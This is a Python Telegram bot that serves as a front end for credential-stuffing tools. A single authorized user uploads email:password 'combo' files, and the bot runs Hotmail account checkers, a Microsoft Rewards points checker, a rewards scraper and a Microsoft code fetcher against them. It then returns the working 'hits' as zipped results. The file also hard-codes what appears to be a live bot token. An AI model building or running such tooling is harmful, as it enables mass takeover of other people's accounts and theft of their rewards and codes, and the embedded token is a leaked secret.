import os
import logging
import threading
import asyncio
import time
import shutil
import glob
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

# Import tools
import flux
import h
import hit
import p7
import pullerv2

# Authorized User ID
AUTHORIZED_USER_ID = 5944410248
# Get token from environment or use the provided one as default
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak")

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Directory for uploads
UPLOADS_DIR = "uploads"
os.makedirs(UPLOADS_DIR, exist_ok=True)

def restricted(func):
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if not update.effective_user or update.effective_user.id != AUTHORIZED_USER_ID:
            logger.warning(f"Unauthorized access attempt by {update.effective_user.id if update.effective_user else 'unknown'}")
            return
        return await func(update, context, *args, **kwargs)
    return wrapped

@restricted
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 **ToolBot Started**\n\n"
        "Please select a tool:\n"
        "/flux - Multi-Platform Rewards Scraper\n"
        "/h - Hotmail Checker (Linked Services)\n"
        "/hit - Advanced Hotmail Checker\n"
        "/p7 - Microsoft Rewards Points Checker\n"
        "/pullerv2 - Microsoft Code Fetcher & Validator\n\n"
        "After selecting, upload your `.txt` combo file.",
        parse_mode='Markdown'
    )

@restricted
async def select_tool(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tool = update.message.text.split()[0][1:]
    context.user_data['selected_tool'] = tool
    await update.message.reply_text(f"✅ Tool `{tool}` selected. Please upload your combo file.")

@restricted
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    selected_tool = context.user_data.get('selected_tool')
    if not selected_tool:
        await update.message.reply_text("❌ Please select a tool first.")
        return

    document = update.message.document
    if not document.file_name.lower().endswith('.txt'):
        await update.message.reply_text("❌ Please upload a valid `.txt` file.")
        return

    file = await context.bot.get_file(document.file_id)
    file_path = os.path.join(UPLOADS_DIR, f"{AUTHORIZED_USER_ID}_{int(time.time())}_{document.file_name}")
    await file.download_to_drive(file_path)

    status_message = await update.message.reply_text(f"⏳ File received. Initializing `{selected_tool}`...")

    # Run tool in a separate thread
    threading.Thread(
        target=run_tool_async,
        args=(selected_tool, file_path, update.effective_chat.id, status_message.message_id, context.application.loop),
        daemon=True
    ).start()

def run_tool_async(tool_name, file_path, chat_id, status_msg_id, bot_loop):
    from telegram import Bot
    bot = Bot(BOT_TOKEN)

    last_update_time = [0] # List to allow modification in closure
    update_interval = 5 # seconds

    def bot_callback(text):
        now = time.time()
        if now - last_update_time[0] < update_interval and "Finished" not in text and "Completed" not in text:
            return
        last_update_time[0] = now

        asyncio.run_coroutine_threadsafe(
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=status_msg_id,
                text=f"⚙️ **[{tool_name.upper()}]**\n{text}",
                parse_mode='Markdown'
            ),
            bot_loop
        )

    try:
        results_path = None
        if tool_name == 'flux':
            parser = flux.ComboParser(file_path)
            accounts = parser.parse()
            settings = flux.Settings()
            scraper = flux.MultiPlatformScraper(accounts, settings, "All", log_callback=bot_callback)
            scraper.check_all()
            results_path = scraper.results_folder

        elif tool_name == 'h':
            checker = h.HotmailChecker(log_callback=bot_callback)
            checker.run(file_path)
            results_path = "Hotmail-Hits.txt"

        elif tool_name == 'hit':
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [l.strip() for l in f.readlines() if ':' in l]
            stats = hit.LiveStats(len(lines), callback=bot_callback)
            checker = hit.UnifiedChecker(check_mode="full_enhanced")
            result_mgr = hit.EnhancedResultManager(f"bot_{int(time.time())}", "full")
            for line in lines:
                email, password = line.split(':', 1)
                res = checker.check(email.strip(), password.strip())
                stats.update(res["status"], res if res["status"] == "HIT" else None)
                if res["status"] == "HIT":
                    result_mgr.save_hit(email, password, res)
                stats.print_live("full_enhanced")
            results_path = result_mgr.base_folder

        elif tool_name == 'p7':
            p7.check_bulk(file_path, callback=bot_callback)
            results_path = "Results"

        elif tool_name == 'pullerv2':
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                accounts = []
                for line in f:
                    if ':' in line:
                        accounts.append(line.strip().split(':', 1))
            pullerv2.phase1_fetch_codes(accounts, callback=bot_callback)
            pullerv2.phase2_validate_codes(accounts, callback=bot_callback)
            results_folders = glob.glob("validation_results_*")
            if results_folders:
                results_path = max(results_folders, key=os.path.getmtime)

        # Final Success Message
        asyncio.run_coroutine_threadsafe(
            bot.send_message(chat_id=chat_id, text=f"✅ Tool `{tool_name}` finished execution!"),
            bot_loop
        )

        # Send results
        if results_path and os.path.exists(results_path):
            if os.path.isdir(results_path):
                zip_name = f"{results_path}_{int(time.time())}"
                shutil.make_archive(zip_name, 'zip', results_path)
                final_file = f"{zip_name}.zip"
            else:
                final_file = results_path

            asyncio.run_coroutine_threadsafe(
                bot.send_document(chat_id=chat_id, document=open(final_file, 'rb')),
                bot_loop
            )

    except Exception as e:
        logger.error(f"Error in {tool_name}: {e}", exc_info=True)
        asyncio.run_coroutine_threadsafe(
            bot.send_message(chat_id=chat_id, text=f"❌ Error in `{tool_name}`: {str(e)}"),
            bot_loop
        )

if __name__ == '__main__':
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler(['flux', 'h', 'hit', 'p7', 'pullerv2'], select_tool))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    logger.info("Bot started...")
    application.run_polling()
